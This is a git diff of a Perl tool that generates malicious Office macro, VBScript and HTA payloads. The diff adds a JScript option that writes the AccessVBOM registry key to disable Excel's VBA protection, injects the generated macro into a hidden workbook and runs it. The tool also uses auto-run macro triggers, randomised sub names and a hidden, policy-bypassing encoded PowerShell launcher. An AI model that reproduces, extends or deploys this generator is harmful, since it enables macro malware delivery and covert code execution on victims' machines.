@@ -49,7 +49,7 @@ use MIME::Base64;
 #  1 for vbscript
 #  2 for vba macro ---> EXPERIMENTAL large macros can be generated affects still unknown...
 #  3 for hta script
-#  4 for sct files ---> IN Development
+#  4 for sct files || JS Macros ---> IN Development
 
 sub set_type { 
 
@@ -63,7 +63,8 @@ sub set_type {
 	print "[] Avaliable Script formats...\n\n";
 	print "[1]-> vbscript\n";
 	print "[2]-> vba macro  [EXPERIMENTAL! Macros with a large code size may fail.]\n";
-	print "[3]-> hta [vbscript]\n\n";
+	print "[3]-> hta [vbscript]\n";
+	print "[4]-> jscript vba macro execution [ REQUIREMENT MS Offices must be installed.]\n\n";
 
 	while (1) {
 		print "[*] Select the option number for the type of code you wish to generate.\n";
@@ -75,6 +76,7 @@ sub set_type {
 			if ( $type eq '1' ) { last; }
 			if ( $type eq '2' ) { last; }
 			if ( $type eq '3' ) { last; }
+			if ( $type eq '4' ) { last; }
 			else { 
 				print "[!] That's not an avaliable option! Try again.\n";
 				$type = <STDIN>;
@@ -315,7 +317,7 @@ sub gen_code {
         my $rfunc = rstr();
 
         if ($stype eq 1 ) { print $fh "\n", ,'Function ' . $rfunc . '()',"\n"; }
-        if ($stype eq 2 ) { print $fh "\n", ,'Sub ' . $rsub . '()',"\n"; }
+        if ($stype eq 2 or $stype eq 4 ) { print $fh "\n", ,'Sub ' . $rsub . '()',"\n"; }
         if ($stype eq 3 ) {
                 print $fh '<SCRIPT LANGUAGE="VBScript">', "\n";
                 print $fh 'sub ' . $rfunc . '()',"\n";
@@ -385,7 +387,7 @@ sub gen_code {
         if ( $nline == 1 ) { print $fh "\n"; }
 
         # set vba syntax
-        if ( $stype eq 2 ) {
+        if ( $stype eq 2 or $stype eq 4 ) {
 
                 my $vbaSh = rstr();
                 my $rvbaCaps = int(rand(2));
@@ -399,18 +401,26 @@ sub gen_code {
 
                 if ( $nline == 1 ) { print $fh "\n"; }
 
-                if ( $rvbaCaps == 1 ) { print $fh "\n", 'sub AutoOpen(): ' . $rsub . ': End sub'; }
-                else { print $fh "\n", 'Sub AutoOpen(): ' . $rsub . ': end Sub', "\n"; }
+		if ( $stype eq 2 ) 
+		{ 
 
-                if ( $nline == 0 ) { print $fh "\n"; }
+                	if ( $rvbaCaps == 1 ) { print $fh "\n", 'sub AutoOpen(): ' . $rsub . ': End sub'; }
+                	else { print $fh "\n", 'Sub AutoOpen(): ' . $rsub . ': end Sub', "\n"; }
 
-                if ( $rvbaCaps == 0 ) { print $fh "\n", 'sub Auto_open(): ' . $rsub . ": end Sub\n"; }
-                else { print $fh "\n", 'sub auto_Open(): ' . $rsub . ': End sub'; }
+                	if ( $nline == 0 ) { print $fh "\n"; }
 
-                if ( $nline == 2 ) { print $fh "\n"; }
+                	if ( $rvbaCaps == 0 ) { print $fh "\n", 'sub Auto_open(): ' . $rsub . ": end Sub\n"; }
+                	else { print $fh "\n", 'sub auto_Open(): ' . $rsub . ': End sub'; }
 
-                if ( $rvbaCaps == 1 ) { print $fh "\n", 'Sub workbook_Open(): ' . $rsub . ': End sub'; }
-                else { print $fh "\n", 'sub Workbook_open(): ' . $rsub . ": end Sub\n"; }
+                	if ( $nline == 2 ) { print $fh "\n"; }
+
+                	if ( $rvbaCaps == 1 ) { print $fh "\n", 'Sub workbook_Open(): ' . $rsub . ': End sub'; }
+                	else { print $fh "\n", 'sub Workbook_open(): ' . $rsub . ": end Sub\n"; }
+
+		}
+
+		# dont forget to return the name of the random sub for use in script type 4
+
 
         }
 
@@ -461,7 +471,63 @@ sub gen_code {
 	print $fh "\n";
 	close $fh;
 
+	return $rsub;
+
 }
+
+sub js_macro {
+
+	# Credit for js code goes to Casey Smith, @subTee
+	# License: BSD 3-Clause
+	
+	my $rsub = $_[0];
+
+	# migh have to loop through new lines to concatinate the code to a variable in the js code example  -> [ strCode += 'a new line' ]
+	my $macro = 'code-output';
+	my $jsMacro = 'js-code-output';
+
+	open(my $fhI, '<', "$macro");
+	open(my $fhO, '+>', "$jsMacro");
+
+	# prep js macro output
+
+	print $fhO "\n";
+	print $fhO "\n", 'var objExcel = new ActiveXObject("Excel.Application");'; 
+	print $fhO "\n", 'objExcel.Visible = false;';
+	print $fhO "\n", 'var WshShell = new ActiveXObject("WScript.Shell");';
+	print $fhO "\n", 'var Application_Version = objExcel.Version;';
+	print $fhO "\n", 'var strRegPath = "HKEY_CURRENT_USER\\\Software\\\Microsoft\\\Office\\\" + Application_Version + "\\\Excel\\\Security\\\AccessVBOM";';
+	print $fhO "\n", 'WshShell.RegWrite(strRegPath, 1, "REG_DWORD");';
+	print $fhO "\n", 'var objWorkbook = objExcel.Workbooks.Add();';
+	print $fhO "\n", 'var xlmodule = objWorkbook.VBProject.VBComponents.Add(1);';
+	print $fhO "\n", 'var strCode = "";';
+	print $fhO "\n";
+
+	while (my $line = <$fhI>) 
+	{ 
+
+		if ($line =~ /^\s*$/) { 
+			# skip line;
+		} else  {
+
+			chomp($line);
+		 	print $fhO 'strCode += ' . q(') . $line . '\n' . q(') . ';' . "\n";
+		}
+ 		
+	} 
+
+	print $fhO "\n", 'xlmodule.CodeModule.AddFromString(strCode);';
+	print $fhO "\n", 'objExcel.Run(' . '"' . $rsub . '"' . ');';
+	print $fhO "\n", 'objExcel.DisplayAlerts = false;';
+	print $fhO "\n", 'objWorkbook.Close(false);';
+
+	close $fhI;
+	print $fhO "\n\n";
+	close $fhO;
+
+	return $jsMacro;	
+
+} 
 
 # test character encoding  
 #  my $cmd = qw(!"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~);
@@ -470,6 +536,7 @@ sub main {
 
 	my $stype = set_type();
 	my $use_encoding = set_encoding();
+	my $script = 'code-output';
 
 	if ($use_encoding eq 'true' ) {
 
@@ -483,7 +550,9 @@ sub main {
 		# Passing an empty string to encode_base64 to prevent any newlines
 		my $encdcmd = encode_base64($utf16le, '');
 		my $base64cmd = 'cmd.exe /c powershell.exe -ep bypass -noni -w hidden -enc' . ' ' . $encdcmd;
-		gen_code($base64cmd, $stype);
+		my $rsub = gen_code($base64cmd, $stype);
+
+		if ($stype == 4 ) { js_macro($rsub); unlink $script; $script = 'js-code-output';  } 
 
 	} else { 
 
@@ -491,11 +560,15 @@ sub main {
         	print '[>] c:\users\some-user\> [ your command you wish to run ]' . "\n";
 
 		my $cmd = get_cmd();
-        	gen_code($cmd, $stype); 
+        	my $rsub = gen_code($cmd, $stype); 
 
+		if ($stype == 4 ) { js_macro($rsub); unlink $script; $script = 'js-code-output'; } 
+		
 	}
 
-	print "[+] Generated to file named code-output..\n";
+
+
+	print "[+] Generated to file named $script";
 	print "\n\n";
 
 }
